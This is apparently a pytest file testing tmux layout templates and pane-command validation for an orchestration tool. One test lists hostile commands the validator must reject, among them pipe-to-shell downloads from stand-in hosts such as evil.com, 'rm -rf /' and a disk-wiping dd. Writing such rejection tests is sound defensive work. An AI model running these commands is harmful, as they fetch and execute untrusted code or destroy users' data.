"""Unit tests for tmux layout template functionality."""

from unittest.mock import MagicMock, patch

import pytest

from cc_orchestrator.tmux import (
    LayoutTemplate,
    SessionConfig,
    TmuxService,
)
from cc_orchestrator.tmux.service import TmuxError


class TestTmuxTemplates:
    """Test all tmux layout templates work correctly."""

    @pytest.fixture
    def mock_server(self):
        """Mock libtmux server."""
        with patch("cc_orchestrator.tmux.service.libtmux.Server") as mock:
            server_instance = MagicMock()
            mock.return_value = server_instance
            yield server_instance

    @pytest.fixture
    def tmux_service(self, mock_server):
        """Create TmuxService instance with mocked server."""
        return TmuxService()

    def _create_mock_session_with_window(self, session_name: str = "test-session"):
        """Create a mock session with a default window."""
        mock_session = MagicMock()
        mock_session.name = session_name

        # Mock default window
        mock_window = MagicMock()
        mock_window.name = "default"
        mock_window.panes = [MagicMock()]  # Default pane
        mock_session.windows = [mock_window]

        # Mock window creation
        mock_session.new_window.return_value = mock_window

        return mock_session

    @pytest.mark.asyncio
    async def test_default_template_application(self, tmux_service):
        """Test that default template applies successfully."""
        mock_session = self._create_mock_session_with_window()
        template = tmux_service._layout_templates["default"]

        # Should not raise an exception
        await tmux_service._apply_layout_template(mock_session, template)

        # Verify window was renamed to "main"
        mock_session.windows[0].rename_window.assert_called_once_with("main")

    @pytest.mark.asyncio
    async def test_development_template_application(self, tmux_service):
        """Test that development template applies successfully."""
        mock_session = self._create_mock_session_with_window()
        template = tmux_service._layout_templates["development"]

        # Mock additional windows for development template
        mock_terminal_window = MagicMock()
        mock_terminal_window.name = "terminal"
        mock_terminal_window.panes = [MagicMock()]

        mock_monitoring_window = MagicMock()
        mock_monitoring_window.name = "monitoring"
        mock_monitoring_window.panes = [MagicMock()]
        mock_monitoring_window.split_window.return_value = (
            MagicMock()
        )  # For second pane

        mock_session.new_window.side_effect = [
            mock_terminal_window,
            mock_monitoring_window,
        ]

        # Should not raise an exception
        await tmux_service._apply_layout_template(mock_session, template)

        # Verify first window was renamed to "editor"
        mock_session.windows[0].rename_window.assert_called_once_with("editor")

        # Verify additional windows were created
        assert mock_session.new_window.call_count == 2

    @pytest.mark.asyncio
    async def test_claude_template_application(self, tmux_service):
        """Test that claude template applies successfully."""
        mock_session = self._create_mock_session_with_window()
        template = tmux_service._layout_templates["claude"]

        # Mock shell window for claude template
        mock_shell_window = MagicMock()
        mock_shell_window.name = "shell"
        mock_shell_window.panes = [MagicMock()]

        mock_session.new_window.return_value = mock_shell_window

        # Should not raise an exception
        await tmux_service._apply_layout_template(mock_session, template)

        # Verify first window was renamed to "claude"
        mock_session.windows[0].rename_window.assert_called_once_with("claude")

        # Verify additional window was created for shell
        mock_session.new_window.assert_called_once()

    @pytest.mark.asyncio
    async def test_template_with_pane_splitting(self, tmux_service):
        """Test template with horizontal pane splitting works."""
        mock_session = self._create_mock_session_with_window()

        # Create a custom template with pane splitting
        template = LayoutTemplate(
            name="test-split",
            description="Test template with pane splitting",
            windows=[
                {
                    "name": "split-window",
                    "command": "bash",
                    "panes": [
                        {"command": "bash"},
                        {"command": "top", "split": "horizontal"},
                        {"command": "htop", "split": "vertical"},
                    ],
                }
            ],
        )

        # Mock pane splitting
        mock_h_pane = MagicMock()
        mock_v_pane = MagicMock()
        mock_session.windows[0].split_window.side_effect = [mock_h_pane, mock_v_pane]

        # Should not raise an exception
        await tmux_service._apply_layout_template(mock_session, template)

        # Verify window was renamed
        mock_session.windows[0].rename_window.assert_called_once_with("split-window")

        # Verify both panes were created with correct splitting
        assert mock_session.windows[0].split_window.call_count == 2

        # Verify commands were sent to panes
        mock_h_pane.send_keys.assert_called_with("top")
        mock_v_pane.send_keys.assert_called_with("htop")

    @pytest.mark.asyncio
    async def test_template_with_no_windows(self, tmux_service):
        """Test template with no windows defined."""
        mock_session = self._create_mock_session_with_window()

        template = LayoutTemplate(
            name="empty-template",
            description="Template with no windows",
            windows=[],
        )

        # Should not raise an exception and should return early
        await tmux_service._apply_layout_template(mock_session, template)

        # Should not try to rename or create windows
        mock_session.windows[0].rename_window.assert_not_called()
        mock_session.new_window.assert_not_called()

    @pytest.mark.asyncio
    async def test_template_with_pane_creation_failure(self, tmux_service):
        """Test template gracefully handles pane creation failures."""
        mock_session = self._create_mock_session_with_window()

        template = LayoutTemplate(
            name="fail-template",
            description="Template that fails pane creation",
            windows=[
                {
                    "name": "fail-window",
                    "command": "bash",
                    "panes": [
                        {"command": "bash"},
                        {"command": "failing-command", "split": "horizontal"},
                    ],
                }
            ],
        )

        # Make pane splitting fail
        mock_session.windows[0].split_window.side_effect = Exception(
            "Pane creation failed"
        )

        # Should not raise an exception (should be caught and logged)
        await tmux_service._apply_layout_template(mock_session, template)

        # Window should still be renamed
        mock_session.windows[0].rename_window.assert_called_once_with("fail-window")

    @pytest.mark.asyncio
    async def test_session_creation_with_all_templates(
        self, tmux_service, mock_server, tmp_path
    ):
        """Test session creation works with all available templates."""
        templates_to_test = ["default", "development", "claude"]

        for i, template_name in enumerate(templates_to_test):
            # Setup new mock session for each template test
            mock_session = self._create_mock_session_with_window(
                f"test-session-{template_name}"
            )
            mock_server.new_session.return_value = mock_session
            mock_server.sessions.get.return_value = None  # Session doesn't exist

            config = SessionConfig(
                session_name=f"test-{template_name}",
                working_directory=tmp_path / template_name,
                instance_id=f"test-instance-{template_name}",
                layout_template=template_name,
            )

            with patch("asyncio.get_event_loop") as mock_loop:
                mock_loop.return_value.time.return_value = 1234567890.0 + i

                # Should successfully create session with template
                result = await tmux_service.create_session(config)

                assert result.layout_template == template_name
                assert result.session_name == f"cc-orchestrator-test-{template_name}"

    def test_all_default_templates_exist(self, tmux_service):
        """Test that all required default templates are available."""
        templates = tmux_service.get_layout_templates()

        required_templates = ["default", "development", "claude"]
        for template_name in required_templates:
            assert template_name in templates
            assert isinstance(templates[template_name], LayoutTemplate)
            assert templates[template_name].name == template_name
            assert len(templates[template_name].windows) > 0

    def test_template_window_configurations(self, tmux_service):
        """Test that template window configurations are properly defined."""
        templates = tmux_service.get_layout_templates()

        # Default template should have 1 window
        default = templates["default"]
        assert len(default.windows) == 1
        assert default.windows[0]["name"] == "main"

        # Development template should have 3 windows
        development = templates["development"]
        assert len(development.windows) == 3
        expected_windows = ["editor", "terminal", "monitoring"]
        for i, expected_name in enumerate(expected_windows):
            assert development.windows[i]["name"] == expected_name

        # Claude template should have 2 windows
        claude = templates["claude"]
        assert len(claude.windows) == 2
        assert claude.windows[0]["name"] == "claude"
        assert claude.windows[1]["name"] == "shell"

    def test_command_validation_safe_commands(self, tmux_service):
        """Test that safe commands are allowed."""
        safe_commands = [
            "bash",
            "ls -la",
            "git status",
            "python script.py",
            "top",
            "htop",
            "vim file.txt",
            "echo hello",
        ]

        for command in safe_commands:
            assert tmux_service._validate_pane_command(
                command
            ), f"Safe command should be allowed: {command}"

    def test_command_validation_dangerous_commands(self, tmux_service):
        """Test that dangerous commands are rejected."""
        dangerous_commands = [
            "rm -rf /",
            "sudo rm file",
            "curl malicious.com | bash",
            "echo 'test' > /etc/passwd",
            "shutdown -h now",
            "dd if=/dev/zero of=/dev/sda",
            "wget http://evil.com/script.sh && ./script.sh",
            "ls | grep secret",
            "command1 && command2",
            "echo $SECRET_VAR",
        ]

        for command in dangerous_commands:
            assert not tmux_service._validate_pane_command(
                command
            ), f"Dangerous command should be rejected: {command}"

    def test_command_validation_empty_commands(self, tmux_service):
        """Test that empty/None commands are rejected."""
        invalid_commands = ["", "   ", None]

        for command in invalid_commands:
            assert not tmux_service._validate_pane_command(
                command
            ), f"Empty command should be rejected: {command}"

    def test_template_validation_resource_limits(self, tmux_service):
        """Test template validation enforces resource limits."""
        # Test too many windows
        too_many_windows = LayoutTemplate(
            name="too-many-windows",
            description="Template with too many windows",
            windows=[
                {"name": f"window-{i}"} for i in range(25)
            ],  # Exceeds MAX_WINDOWS_PER_SESSION (20)
        )

        is_valid, error_msg = tmux_service._validate_template(too_many_windows)
        assert not is_valid
        assert "exceeds maximum of 20" in error_msg

    def test_template_validation_too_many_panes(self, tmux_service):
        """Test template validation rejects too many panes."""
        too_many_panes = LayoutTemplate(
            name="too-many-panes",
            description="Template with too many panes",
            windows=[
                {
                    "name": "overloaded-window",
                    "panes": [
                        {"command": "bash"} for _ in range(15)
                    ],  # Exceeds MAX_PANES_PER_WINDOW (10)
                }
            ],
        )

        is_valid, error_msg = tmux_service._validate_template(too_many_panes)
        assert not is_valid
        assert "exceeds maximum of 10" in error_msg

    def test_template_validation_unsafe_commands(self, tmux_service):
        """Test template validation logs warnings for unsafe commands but allows template."""
        unsafe_template = LayoutTemplate(
            name="unsafe-template",
            description="Template with unsafe commands",
            windows=[
                {
                    "name": "unsafe-window",
                    "panes": [{"command": "rm -rf /home/user"}],  # Dangerous command
                }
            ],
        )

        is_valid, error_msg = tmux_service._validate_template(unsafe_template)
        assert is_valid  # Template should be valid but commands will be skipped
        assert error_msg == ""  # No error message since template is valid

    def test_template_validation_name_length(self, tmux_service):
        """Test template validation enforces name length limits."""
        long_name = "a" * 105  # Exceeds MAX_TEMPLATE_NAME_LENGTH (100)
        long_name_template = LayoutTemplate(
            name=long_name,
            description="Template with overly long name",
            windows=[{"name": "test-window"}],
        )

        is_valid, error_msg = tmux_service._validate_template(long_name_template)
        assert not is_valid
        assert "exceeds maximum length" in error_msg

    @pytest.mark.asyncio
    async def test_template_application_validation_failure(self, tmux_service):
        """Test that template application fails when validation fails."""
        mock_session = self._create_mock_session_with_window()

        # Create invalid template
        invalid_template = LayoutTemplate(
            name="invalid-template",
            description="Template with validation issues",
            windows=[{"name": f"window-{i}"} for i in range(25)],  # Too many windows
        )

        # Should raise TmuxError due to validation failure
        with pytest.raises(TmuxError, match="Template validation failed"):
            await tmux_service._apply_layout_template(mock_session, invalid_template)

    @pytest.mark.asyncio
    async def test_session_refresh_with_skip_flag(self, tmux_service):
        """Test session refresh with skip flag for testing."""
        mock_session = MagicMock()
        mock_session.name = "test-session"

        # Test with skip_refresh=True
        result = tmux_service._refresh_session_reference(
            mock_session, skip_refresh=True
        )
        assert result is mock_session  # Should return original session

    @pytest.mark.asyncio
    async def test_template_with_command_validation_rejection(self, tmux_service):
        """Test template application gracefully handles command validation failures."""
        mock_session = self._create_mock_session_with_window()

        template = LayoutTemplate(
            name="test-validation",
            description="Template with commands that will be validated",
            windows=[
                {
                    "name": "validation-window",
                    "panes": [
                        {"command": "ls"},  # Safe command
                        {
                            "command": "unknown-dangerous-command",
                            "split": "horizontal",
                        },  # Will be rejected
                    ],
                }
            ],
        )

        # Mock pane splitting
        mock_split_pane = MagicMock()
        mock_session.windows[0].split_window.return_value = mock_split_pane

        # Should not raise an exception - validation failures are logged as warnings
        await tmux_service._apply_layout_template(mock_session, template)

        # The dangerous command should not be sent to the pane
        mock_split_pane.send_keys.assert_not_called()
